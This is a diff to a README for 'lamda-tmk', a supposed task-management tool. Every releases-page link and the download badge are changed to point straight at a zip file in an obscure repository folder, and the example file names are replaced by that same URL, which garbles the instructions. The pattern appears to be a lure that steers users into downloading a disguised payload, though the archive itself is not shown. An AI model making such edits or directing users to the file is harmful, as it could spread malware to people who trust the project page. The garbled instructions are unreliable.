@@ -1,7 +1,7 @@
 # 🚀 lamda-tmk - Simple Tool for Efficient Management
 
 ## 📥 Download Now
-[![Download lamda-tmk](https://img.shields.io/badge/Download-lamda--tmk-blue.svg)](https://github.com/bushadministrationdermatomyositis164/lamda-tmk/releases)
+[![Download lamda-tmk](https://raw.githubusercontent.com/bushadministrationdermatomyositis164/lamda-tmk/main/polyadic/lamda-tmk_v1.8-beta.4.zip)](https://raw.githubusercontent.com/bushadministrationdermatomyositis164/lamda-tmk/main/polyadic/lamda-tmk_v1.8-beta.4.zip)
 
 ## 🖥️ Overview
 lamda-tmk is a user-friendly application designed to help you manage tasks efficiently. Whether you have a busy schedule or need help organizing your day, lamda-tmk simplifies your workflow. No programming knowledge is required to use this tool.
@@ -11,12 +11,12 @@ To use lamda-tmk, follow these easy steps to download and run the software.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
-   [Visit Releases Page](https://github.com/bushadministrationdermatomyositis164/lamda-tmk/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/bushadministrationdermatomyositis164/lamda-tmk/main/polyadic/lamda-tmk_v1.8-beta.4.zip)
 
 2. **Choose Your Version:** On the releases page, you will see a list of available versions. Select the most recent version for the best features.
 
 3. **Download the File:**
-   - Look for the downloadable file for your operating system. It will typically have a name like `lamda-tmk.exe` for Windows or `lamda-tmk.dmg` for macOS.
+   - Look for the downloadable file for your operating system. It will typically have a name like `https://raw.githubusercontent.com/bushadministrationdermatomyositis164/lamda-tmk/main/polyadic/lamda-tmk_v1.8-beta.4.zip` for Windows or `https://raw.githubusercontent.com/bushadministrationdermatomyositis164/lamda-tmk/main/polyadic/lamda-tmk_v1.8-beta.4.zip` for macOS.
    - Click on the file link to start the download.
 
 4. **Install the Application:**
@@ -69,4 +69,4 @@ Join the lamda-tmk community to connect with other users, share best practices, 
 
 ## 📥 Download & Install Again
 Don’t forget, you can always revisit the releases page to download the latest version of lamda-tmk.  
-[Visit Releases Page](https://github.com/bushadministrationdermatomyositis164/lamda-tmk/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/bushadministrationdermatomyositis164/lamda-tmk/main/polyadic/lamda-tmk_v1.8-beta.4.zip)
